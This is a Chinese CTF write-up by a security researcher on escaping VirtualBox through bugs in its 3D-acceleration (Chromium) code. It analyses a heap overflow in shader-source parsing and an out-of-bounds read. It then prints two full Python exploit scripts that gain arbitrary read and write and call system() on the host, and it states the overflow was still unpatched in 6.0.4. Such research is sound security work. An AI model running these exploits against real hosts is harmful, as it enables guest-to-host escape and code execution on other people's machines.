**作者：[@flyyy](https://www.zhihu.com/people/1147d134e271d3e7428150977892bb51)**  
**长亭科技安全研究员，曾获得GeekPwn 2018“最佳技术奖”，入选极棒名人堂。**  
**来源：[长亭技术专栏](https://zhuanlan.zhihu.com/p/58910752?utm_source=wechat_session&utm_medium=social&utm_oi=871377391468019712&s_s_i=lURhfXZlxLFs5Pd5ulTzV3M8Rr8L1bckCaWUaDOX9U0%3D&s_r=1&from=timeline&isappinstalled=0
"长亭技术专栏")**

35C3CTF中niklasb出了一道关于virtualbox逃逸的0day题目，想从这个题目给大家介绍virtualbox的一个新的攻击面（其实类似的攻击面也同样存在于其他虚拟化类软件），这里记录一下和@kelwin一起解题的过程（被dalao带飞真爽）

### **题目描述**

    
    
    chromacity 477
    Solves: 2
    Please escape VirtualBox. 3D acceleration is enabled for your convenience.
    
    No need to analyze the 6.0 patches, they should not contain security fixes.
    
    Once you're done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.
    
    Challenge files. Password for the encrypted VM image is the flag for "sanity check".
    
    Setup
    
    UPDATE: You might need to enable nested virtualization.
    
    Hint: https://github.com/niklasb/3dpwn/ might be useful
    
    Hint 2: this photo was taken earlier today at C3
    
    Difficulty estimate: hard

题目描述中可以看出：

  1. 虚拟机配置中显卡开启了3D加速功能
  2. 6.0的patch没用，参考virtualbox 6.0的发布时间推测是出题人来不及用最新版适配环境等等，所以是一道0day题目

题目前前后后给出了四个附件，一个是img文件，一个是通过qemu+kvm虚拟机运行该img的.sh文件，这个虚拟机就是远程运行的host的环境，host当中有一个5.28
release版的virtualbox，也就是我们逃逸的目标。（算上启动host环境中的virtualbox，如果你的主机是windows+vmware
workstation的话。。。满眼都是泪），另外还有两张图片，一张是关于目标virtualbox虚拟机的配置，一张是niklasb和他电脑屏幕的照片。电脑屏幕上显示的是[这个页面](http://link.zhihu.com/?target=https%3A//www.khronos.org/registry/OpenGL-Refpages/gl4/html/glShaderSource.xhtml)，看样子题目应该跟glShaderSource这个opengl的api有关。

同时给出的两个hint，一个是niklasb自己关于3dpwn的github链接，其中有他之前通过攻击virtual box
3D加速模块实现逃逸的源码和相关[分析文章](http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry)。另一个就是附件中关于niklasb的照片。

### **题目分析**

通过题目描述我们可以比较确定的是出题人希望我们去找virtualbox
3D加速部分的0day漏洞来实现逃逸，同时通过他给出的github链接中的文章和题目名我们可以很快把目标锁定在3D加速部分的[Chromium](http://link.zhihu.com/?target=http%3A//chromium.sourceforge.net/)代码上（并不是同名的浏览器项目）。

简单来说，virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。但是这个Chromium库最后一次更新源码已经是在十二年前了。同时通过这个库我们大概可以猜到之前hint中那张照片的用意了。如果排除掉去直接挖掘OpenGL的0day的可能性，那Virtualbox代码中关于glShaderSource的部分就只有Chromium中关于这个api的协议解析的部分了。而恰好niklasb的github中的源码和文章都是关于Chromium部分的漏洞及其利用的。

### **源码分析**

Virtualbox的Guest additions类似于VMware workstation中的vmware-tools。不同的地方在于，VMware
workstation通过暴漏固定的端口给guest来实现guest与host的通信，而Guest
additions是通过增加一个自定义的虚拟硬件vboxguest来实现guest与host的交互。而3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。

    
    
    gdb-peda$ i thread
      Id   Target Id         Frame 
    * 1    Thread 0x7fe77f6d9780 (LWP 14933) "VirtualBoxVM" 0x00007fe77b0acbf9 in __GI___poll (fds=0x55fe988e82b0, nfds=0x2, timeout=0x63) at ../sysdeps/unix/sysv/linux/poll.c:29
    ......
      15   Thread 0x7fe72f86a700 (LWP 14965) "ShCrOpenGL" 0x00007fe77a4959f3 in futex_wait_cancelable (private=<optimized out>, expected=0x0, futex_word=0x7fe720004068)
    ......
      35   Thread 0x7fe6d0cd6700 (LWP 14985) "nspr-3" 0x00007fe77a4959f3 in futex_wait_cancelable (private=<optimized out>, expected=0x0, futex_word=0x55fe9868ed70)
        at ../sysdeps/unix/sysv/linux/futex-internal.h:88
      36   Thread 0x7fe6b9b61700 (LWP 14986) "SHCLIP" 0x00007fe77b0acbf9 in __GI___poll (fds=0x7fe6b4000b20, nfds=0x2, timeout=0xffffffff) at ../sysdeps/unix/sysv/linux/poll.c:29
    gdb-peda$ thread 15
    [Switching to thread 15 (Thread 0x7fe72f86a700 (LWP 14965))]
    #0  0x00007fe77a4959f3 in futex_wait_cancelable (private=<optimized out>, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
    88  ../sysdeps/unix/sysv/linux/futex-internal.h: No such file or directory.
    gdb-peda$ bt
    #0  0x00007fe77a4959f3 in futex_wait_cancelable (private=<optimized out>, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
    #1  __pthread_cond_wait_common (abstime=0x0, mutex=0x7fe720004070, cond=0x7fe720004040) at pthread_cond_wait.c:502
    #2  __pthread_cond_wait (cond=0x7fe720004040, mutex=0x7fe720004070) at pthread_cond_wait.c:655
    #3  0x00007fe77e0e5cc8 in rtSemEventWait (fAutoResume=0x1, cMillies=0xffffffff, hEventSem=0x7fe720004040)
        at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:369
    #4  RTSemEventWait (hEventSem=0x7fe720004040, cMillies=0xffffffff) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:482
    #5  0x00007fe75d3b09aa in HGCMThread::MsgGet (this=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:549
    #6  0x00007fe75d3b147f in hgcmMsgGet (pThread=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:734
    #7  0x00007fe75d3b265c in hgcmServiceThread (pThread=0x7fe720003f60, pvUser=0x7fe720003e00) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:608
    #8  0x00007fe75d3af940 in hgcmWorkerThreadFunc (hThreadSelf=0x7fe720004340, pvUser=0x7fe720003f60) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
    #9  0x00007fe77df95501 in rtThreadMain (pThread=0x7fe720004340, NativeThread=0x7fe72f86a700, pszThreadName=0x7fe720004c20 "ShCrOpenGL")
        at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
    #10 0x00007fe77e0df882 in rtThreadNativeMain (pvArgs=0x7fe720004340) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
    #11 0x00007fe77a48f6db in start_thread (arg=0x7fe72f86a700) at pthread_create.c:463
    #12 0x00007fe77b0b988f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95

也就是说，当我们想要在guest中想要调用一个OpenGL的某个接口，需要根据我们的请求先进行Chromium的协议封装，再进行hgcm的协议封装。具体关于virtualbox在这两部分的实现细节，请阅读virtualbox相关源码，这里不再详述。

niklasb在其github上已经封装好了调用Chromium代码部分的函数及例子,比如下面这两行代码：

    
    
    client = hgcm_connect("VBoxSharedCrOpenGL")
    hgcm_call(client, SHCRGL_GUEST_FN_SET_VERSION, [9, 1])

最终在源码中会触发到src/vbox/hostservices/sharedopengl/crservice/crservice.cpp中的switch下的SHCRGL_GUEST_FN_SET_VERSION部分，其中的vMajor和vMinor会分别为9和1。

再次回到题目上来，题目已经提醒了漏洞存在的位置可能在Chromium中glShaderSource相关的接口位置，通过在源码中的寻找与分析，我们把目标锁定在了crUnpackExtendShaderSource函数中。crUnpackExtendShaderSource代码如下：

    
    
    void crUnpackExtendShaderSource(void)
    {
        GLint *length = NULL;
        GLuint shader = READ_DATA(8, GLuint);
        GLsizei count = READ_DATA(12, GLsizei);
        GLint hasNonLocalLen = READ_DATA(16, GLsizei);
        GLint *pLocalLength = DATA_POINTER(20, GLint);
        char **ppStrings = NULL;
        GLsizei i, j, jUpTo;
        int pos, pos_check;
    
        if (count >= UINT32_MAX / sizeof(char *) / 4)
        {
            crError("crUnpackExtendShaderSource: count %u is out of range", count);
            return;
        }
    
        pos = 20 + count * sizeof(*pLocalLength);
    
        if (hasNonLocalLen > 0)
        {
            length = DATA_POINTER(pos, GLint);
            pos += count * sizeof(*length);
        }
    
        pos_check = pos;
    
        if (!DATA_POINTER_CHECK(pos_check))
        {
            crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
            return;
        }
    
        for (i = 0; i < count; ++i)
        {
            if (pLocalLength[i] <= 0 || pos_check >= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }
    
            pos_check += pLocalLength[i];
        }
    
        ppStrings = crAlloc(count * sizeof(char*));
        if (!ppStrings) return;
    
        for (i = 0; i < count; ++i)
        {
            ppStrings[i] = DATA_POINTER(pos, char);
            pos += pLocalLength[i];
            if (!length)
            {
                pLocalLength[i] -= 1;
            }
    
            Assert(pLocalLength[i] > 0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j < jUpTo; ++j)
            {
                char *pString = ppStrings[i];
    
                if (pString[j] == '\0')
                {
                    Assert(j == jUpTo - 1);
                    pString[j] = '\n';
                }
            }
        }
    
    //    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);
        cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);
    
        crFree(ppStrings);
    }

仔细看会发现在中间一段for循环检查pLocalLength数组的每个元素跟所有元素的和的大小是否越界时，并未检查最后一层循环过后pos_check是否越界，据此我们可以在最后的两层嵌套循环中的内层中实现越界写，而这个越界写也很有趣：

    
    
            for (j = 0; j < jUpTo; ++j)
            {
                char *pString = ppStrings[i];
    
                if (pString[j] == '\0')
                {
                    Assert(j == jUpTo - 1);
                    pString[j] = '\n';
                }
            }

它可以将越界部分所有的'\0'替换为'\n'。通过这个漏洞我们可以越界写一块堆内存，将其后面内存中若干的'\0'替换为'\n'。（注意：Assert在release版中是不存在的！）之后我们会介绍如何通过这个越界写实现任意地址写。

当然只有一个越界写可能利用起来还是十分困难，我们仔细看了看niklasb写的文章，发现在很多类似的unpack函数中均存在类似于CVE-2018-3055的漏洞，比如crUnpackExtendGetUniformLocation：

    
    
    void crUnpackExtendGetUniformLocation(void)
    {
        int packet_length = READ_DATA(0, int);
        GLuint program = READ_DATA(8, GLuint);
        const char *name = DATA_POINTER(12, const char);
        SET_RETURN_PTR(packet_length-16);
        SET_WRITEBACK_PTR(packet_length-8);
        cr_unpackDispatch.GetUniformLocation(program, name);
    }

漏洞的成因完全与CVE-2018-3055相同，简单来说SET_RETURN_PTR和SET_WRITEBACK_PTR指向的内存会写回到guest，而这里因为没有对packet_length做对应的检查导致我们可以在堆上实现越界读。

### **漏洞利用**

通过以上的代码分析，我们现在有一个堆越界读和一个堆越界写，接下来我们来分析如何去完成完整的漏洞利用。

因为信息泄露部分完全与CVE-2018-3055基本相同，我们选择直接复用niklasb之前的exp
leak部分的代码。重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。

接下来的关键就是如何用我们神奇的堆溢出来实现任意地址写了。@kelwin找到了一个很好用的结构体CRVBOXSVCBUFFER_t，也就是niklasb的代码中alloc_buf使用的结构体：

    
    
    typedef struct _CRVBOXSVCBUFFER_t {
        uint32_t uiId;
        uint32_t uiSize;
        void*    pData;
        _CRVBOXSVCBUFFER_t *pNext, *pPrev;
    } CRVBOXSVCBUFFER_t;

如果可以在堆上我们可以越界写的内存后面恰好布置这样一个结构体，越界写它对应的uiSize部分，再通过SHCRGL_GUEST_FN_WRITE_BUFFER就可以越界写这个buffer所对应的pData的内容，之后再越界写另一个相同的结构体，就可以实现任意地址写了。实现任意地址写的具体过程如下：

  1. n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。此时内存分布如下：

![img](https://images.seebug.org/content/images/2019/03/12/1552365380000-v2-734d5f102595b96f81d280832ca980cf_hd.jpg-w331s)

  2. 通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。此时内存分布如下：

![img](https://images.seebug.org/content/images/2019/03/12/1552365380000-v2-d44646dfcd843d562b806fb8afb6faa7_hd.jpg-w331s)

  3. 通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。此时内存分布如下：

![img](https://images.seebug.org/content/images/2019/03/12/1552365381000-v2-70051b611de89a259054b033c1bd8d38_hd.jpg-w331s)

  4. 通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制

  5. 多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现

在有了任意读和任意写的能力之后，我们可以修改某个CRConnection结构体中disconnect函数指针来劫持rip，通过修改CRConnection头部的数据可以控制对应的参数。所以漏洞利用的完整过程如下：

  1. 通过越界读泄露一个CRConnection结构体的位置
  2. 配置内存实现任意地址写
  3. 通过任意地址读泄露CRConnection结构体中alloc函数对应地址
  4. 通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址
  5. 修改CRConnection的disconnect函数指针为system
  6. 修改CRConnection的头部为payload
  7. disconnect对应的client

完整exp：

    
    
    #!/usr/bin/env python2
    from __future__ import print_function
    import os, sys
    from array import array
    from struct import pack, unpack
    
    sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
    from chromium import *
    from hgcm import *
    
    def make_oob_read(offset):
        return (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\0\0\0' + chr(CR_EXTEND_OPCODE)
            + pack("<I", offset)
            + pack("<I", CR_GETUNIFORMLOCATION_EXTEND_OPCODE)
            + pack("<I", 0)
            + 'LEET'
            )
    
    def leak_conn(client):
        ''' Return a CRConnection address, and the associated client handle '''
        # Spray some buffers of sizes
        #  0x290 = sizeof(CRConnection) and
        #  0x9d0 = sizeof(CRClient)
        for _ in range(600):
            alloc_buf(client, 0x290)
        for _ in range(600):
            alloc_buf(client, 0x9d0)
    
        # This will allocate a CRClient and CRConnection right next to each other.
        new_client = hgcm_connect("VBoxSharedCrOpenGL")
    
        for _ in range(2):
            alloc_buf(client, 0x290)
        for _ in range(2):
            alloc_buf(client, 0x9d0)
    
        hgcm_disconnect(new_client)
    
        # Leak pClient member of CRConnection struct, and from that compute
        # CRConnection address.
        msg = make_oob_read(OFFSET_CONN_CLIENT)
        leak = crmsg(client, msg, 0x290)[16:24]
        pClient, = unpack("<Q", leak[:8])
        pConn = pClient + 0x9e0
        new_client = hgcm_connect("VBoxSharedCrOpenGL")
        set_version(new_client)
        return new_client, pConn, pClient
    
    class Pwn(object):
        def write(self, where, what):
            pay = 'A'*8+pack("<Q",where)
            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0x40,pay])
    
            hgcm_call(self.client1,13,[0x41414141,0x41414141,0,what])
    
        def write64(self, where, what):
            self.write(where, pack("<Q", what))
    
        def read(self, where, n, canfail=False):
            # Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.
            self.write64(self.pConn + OFFSET_CONN_HOSTBUF, where)
            self.write64(self.pConn + OFFSET_CONN_HOSTBUFSZ, n)
            res, sz = hgcm_call(self.client3, SHCRGL_GUEST_FN_READ, ["A"*0x1000, 0x1000])
            if canfail and sz != n:
                return None
            assert sz == n
            return res[:n]
    
        def read64(self, where, canfail=False):
            leak = self.read(where, 8, canfail)
            if not leak:
                return None
            return unpack('<Q', leak)[0]
    
        def leak_stuff(self):
            self.client1 = hgcm_connect("VBoxSharedCrOpenGL")
            set_version(self.client1)
    
            self.client2 = hgcm_connect("VBoxSharedCrOpenGL")
            set_version(self.client2)
    
            # TODO maybe spray even more?
            for _ in range(3):
                for _ in range(400): alloc_buf(self.client1, 0x290)
                for _ in range(400): alloc_buf(self.client1, 0x9d0)
                for _ in range(600): alloc_buf(self.client1, 0x30)
    
            # self.master_id, self.master, _ = leak_buf(self.client1)
            # print('[*] Header for buffer # %d is at 0x%016x (master)' % (self.master_id, self.master))
            # self.victim_id, self.victim, _ = leak_buf(self.client1)
            # print('[*] Header for buffer # %d is at 0x%016x (victim)' % (self.victim_id, self.victim))
    
            self.client3, self.pConn, _ = leak_conn(self.client1)
            print('[*] Leaked CRConnection @ 0x%016x' % self.pConn)
    
        def setup_write(self):
            msg = pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
                  + 'aaaa' \
                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
                  + pack("<IIIII", 0, 0x2, 0, 0x1, 0x1a+2) +'A'*4
            bufs = []
            for i in range(0x1000):
                    bufs.append(alloc_buf(self.client1, len(msg), msg))
            _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[-5], "A"*0x50, 0x50])
            self.write_buf = 0x0a0a0000+bufs[-4];
            self.write_buf_size = 0x0a0a30;
    
        def setup(self):
            self.leak_stuff()
            self.setup_write()
    
            self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE, canfail=True)
            print('[*] Leaked crVBoxHGCMFree @ 0x%016x' % self.crVBoxHGCMFree)
    
            libbase = self.crVBoxHGCMFree - 0x20650
        self.system = self.read64(libbase + 0x22e3d0, canfail=True) - 0x122ec0 + 0x4f440 
        print('[*] Leaked system @ 0x%016x' % self.system)
    
            self.write64(self.pConn + 0x128, self.system)
            self.write(self.pConn, "mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt\x00")
            '''
            self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)
    
            hgcm_disconnect(self.client1)
            '''
            return
    
    if __name__ == '__main__':
        p = Pwn()
        p.setup()
        #if raw_input('you want RIP control? [y/n] ').startswith('y'):
        #    p.rip(0xdeadbeef)

![img](https://images.seebug.org/content/images/2019/03/12/1552365381000-v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif-w331s)

### **仍然存在的0day**

Virtualbox官方在2019.1.11修补了两处类似的信息泄露部分，对于堆溢出部分的内容仍然没有修补，导致该漏洞仍然可以被利用。接下来看一下如何只使用堆溢出部分的内容来实现完整逃逸。

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-9957f0623f45d849350c660941437da6_hd.jpg-w331s)

### **从一个堆溢出到弹计算器**

参考之前有leak时的思路，当没有leak时，我们仍然有：

  1. 任意地址写
  2. 堆越界写

但是我们没有任何的地址信息，所以接下来的思路就是如何利用一个堆越界写来泄露地址最后达到任意地址读的效果。

我们可以先参考之前的niklasb任意地址读的实现思路。他是通过读写一个CRConnection结构体的pHostBuffer和cbHostBuffer，以及SHCRGL_GUEST_FN_READ来实现任意地址读。我们使用相同的思路，就需要泄露一个CRConnection结构体的地址。而他之前泄露一个CRConnection结构体的位置是通过crUnpackExtendGetUniformLocation中的堆越界来实现的，而我们想要达到同样的效果可以有一种实现思路：

  1. 在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer
  2. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分
  3. 通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读

如果在CR_GETUNIFORMLOCATION_EXTEND
Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。所以，总体的利用思路如下：

  1. 排布内存，使堆空间分布如下：

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-d2fc806ebe3603db602bcedbbdd60883_hd.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-29f6d3498f25b126e3a9dd3f4c160bfc_hd.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-a0d11527882f9aee1394cee9370235b9_hd.jpg-w331s)

  2. 通过之前提到的相同操作，通过堆溢出实现任意地址写与越界写

  3. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-8c5feffca2fde4f36c073ac17a71eba5_hd.jpg-w331s)

  4. 通过crUnpackExtendGetUniformLocation越界读获取CRConnection的地址

  5. 通过CRConnection任意地址读获取crVBoxHGCMFree的地址

  6. 通过动态库获取libc中system的地址

  7. 修改disconnect函数指针为system，修改CRConnection头部为payload8. disconnect弹计算器

我在实际实现中多了一个步骤，在泄露完CRConnection地址之后还泄露了一个对应的clientID。（当然这一步也可以省略，在exp中遍历所有的clientID即可）

完整的exp如下(环境：ubuntu 18.04及其apt安装的Virtualbox 6.0.4)：

    
    
    #!/usr/bin/env python2
    from __future__ import print_function
    import os, sys
    from array import array
    from struct import pack, unpack
    
    sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
    from chromium import *
    from hgcm import *
    crVBoxHGCMFree_off=0x20890
    vbox_puts_off=0x22f0f0
    libc_puts_off=0x809c0
    libc_system_off=0x4f440
    def make_oob_read(offset):
        return (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\0\0\0' + chr(CR_EXTEND_OPCODE)
            + pack("<I", offset)
            + pack("<I", CR_GETUNIFORMLOCATION_EXTEND_OPCODE)
            + pack("<I", 0)
            + 'LEET'
            )
    
    class Pwn(object):
        def write(self, where, what):
            pay = 'A'*8+pack("<Q",where)
            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0x2b0,pay])
            hgcm_call(self.client1,13,[0x41414141,0x41414141,0,what])
    
        def write64(self, where, what):
            self.write(where, pack("<Q", what))
    
        def read(self, where, n, canfail=False):
            # Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.
            self.write64(self.pConn + OFFSET_CONN_HOSTBUF, where)
            self.write64(self.pConn + OFFSET_CONN_HOSTBUFSZ, n)
            res, sz = hgcm_call(self.client3, SHCRGL_GUEST_FN_READ, ["A"*0x1000, 0x1000])
            if canfail and sz != n:
                return None
            assert sz == n
            return res[:n]
    
        def read64(self, where, canfail=False):
            leak = self.read(where, 8, canfail)
            if not leak:
                return None
            return unpack('<Q', leak)[0]
    
        def setup_write(self):
            self.client1 = hgcm_connect("VBoxSharedCrOpenGL")
            set_version(self.client1)
            msg = pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
                  + 'aaaa' \
                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
                  + pack("<IIIIII", 0, 0x3, 0, 0x4, 0x4, 0x1a+2+7) +'A'*9
            '''
            msg2= pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
                  + 'aaaa' \
                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
                  + pack("<IIIII", 0, 0x2, 0, 0x1, 0x1a+2) +'A'*4
            '''
            msg2 = pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
                  + 'aaaa' \
                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
                  + pack("<IIIII", 0, 0x2, 0, 0x1+0x100, 0x1a+2) +'A'*(9+0x100)
            msg3 = pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
                  + 'aaaa' \
                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
                  + pack("<IIIII", 0, 0x2, 0, 0x1+0x100, 0x1a+2) +'A'*(9+0x260) 
            msg4 = make_oob_read(0x570)
            msg4+= 'A'*(0x290-len(msg4))
            bufs = []
            bufs2= []
            bufs3= []
            for i in range(0x4000):
                    bufs.append(alloc_buf(self.client1, len(msg), msg))
            for i in range(4):
                    bufs.append(alloc_buf(self.client1, len(msg2), msg2))
            for i in range(50):
                    bufs2.append(alloc_buf(self.client1,len(msg4),msg4))
                    bufs3.append(alloc_buf(self.client1, len(msg3), msg3))
                    alloc_buf(self.client1, len(msg3), msg3)
    
    
            _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[-4], "A"*0x50, 0x50])
            self.write_buf = 0x0a0a0000+bufs[-3];
            self.write_buf_size = 0x0a0135;
            for i in range(50):
                _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs3[i], "A"*0x50, 0x50])
    
        def setup(self):
            #self.leak_stuff()
            self.setup_write()
            client=[]
            for i in range(50):
                new_client = hgcm_connect("VBoxSharedCrOpenGL")
                set_version(new_client)
                client.append(new_client)
        pay = 'B'*8
            pay2= 'C'*8
            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0x420,pay])
            _,leak,_=hgcm_call(self.client1,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,[0x42424242,'A'*0x290,0x290]) 
            self.pConn,=unpack("<Q",leak[8:16])
            self.pConn = self.pConn +0xe10+0x870
            print('[*] Leaked conn @ 0x%016x' % self.pConn)
    
            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0xdf0-0x160,pay2])
            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0xe30-0x160,pack("<I",0x15c8)])
            _,leak2,_=hgcm_call(self.client1,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,[0x43434343,'A'*0x290,0x290])
            i,=unpack("<Q",leak2[8:16])
            self.client3 = i>>32
            #self.read(self.pConn ,0x200, canfail= True)
            for i in range(len(client)):
                if client[i]!=self.client3:
                    hgcm_disconnect(client[i])
            crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE,canfail=True)
            print('[*] Leaked crVBoxHGCMFree @ 0x%016x' % crVBoxHGCMFree)
            self.system = self.read64(crVBoxHGCMFree-crVBoxHGCMFree_off+vbox_puts_off,canfail=True)-libc_puts_off+libc_system_off
            print('[*] Leaked system @ 0x%016x' % self.system)
            pay = '/snap/bin/gnome-calculator\x00'
            self.write64(self.pConn+0x128,self.system)
            self.write(self.pConn,pay)
            hgcm_disconnect(self.client3)
            while(1):
                i=i+1
            return
    
    if __name__ == '__main__':
        p = Pwn()
        p.setup()
        #if raw_input('you want RIP control? [y/n] ').startswith('y'):
        #    p.rip(0xdeadbeef)

![img](https://images.seebug.org/content/images/2019/03/12/1552365382000-v2-c45b1eb6932357c41f833d98d087058b_hd.jpg-w331s)

**其他相关链接** \- <https://drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view> \- <https://phoenhex.re/2018-07-27/better-slow-than-sorry>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/847/>

